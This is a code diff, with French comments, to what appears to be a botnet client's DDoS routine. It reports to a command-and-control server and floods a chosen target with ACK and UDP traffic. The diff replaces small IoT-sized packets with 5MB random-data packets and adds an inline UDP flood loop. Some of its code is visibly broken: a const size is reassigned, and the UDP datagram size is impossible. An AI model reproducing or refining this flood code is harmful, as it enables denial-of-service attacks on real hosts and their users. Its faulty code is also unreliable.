@@ -198,10 +198,18 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
     time_t start_time = time(NULL);
     int sock;
 
-    // Petits paquets pour IoT (128-256 octets)
-    char small_packet[256];
-    for (int i = 0; i < 256; i++) {
-        small_packet[i] = rand() % 256;
+    // Paquets de 5MB pour les attaques
+    const int PACKET_SIZE = 5 * 1024 * 1024; // 5MB
+    char* large_packet = (char*)malloc(PACKET_SIZE);
+    if (large_packet == NULL) {
+        // Si pas assez de mémoire, utiliser un plus petit paquet
+        PACKET_SIZE = 64 * 1024; // 64KB
+        large_packet = (char*)malloc(PACKET_SIZE);
+    }
+    
+    // Remplir le paquet avec des données aléatoires
+    for (int i = 0; i < PACKET_SIZE; i++) {
+        large_packet[i] = rand() % 256;
     }
     
     // Informer le serveur C2 du début de l'attaque
@@ -289,12 +297,12 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
         free(sockets);
     }
     else if (strcmp(method, "ack") == 0) {
-        // ACK flood - très léger pour IoT
+        // ACK flood
         while (time(NULL) - start_time < duration) {
             sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
             if (sock != -1) {
                 connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
-                send(sock, small_packet, 64, 0); // Juste 64 octets
+                send(sock, large_packet, 64, 0); // Juste 64 octets
                 close(sock);
             }
             usleep(5000); // 5ms délai
@@ -318,7 +326,16 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
         }
     }
     else if (strcmp(method, "udp") == 0) {
-        udp_flood(target, port, duration);
+        // Attaque UDP améliorée avec paquets de 5MB
+        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (sock != -1) {
+            while (time(NULL) - start_time < duration) {
+                sendto(sock, large_packet, PACKET_SIZE, 0,
+                       (struct sockaddr*)&target_addr, sizeof(target_addr));
+                usleep(1000); // 1ms délai
+            }
+            close(sock);
+        }
     }
     
     // Informer le serveur C2 de la fin de l'attaque
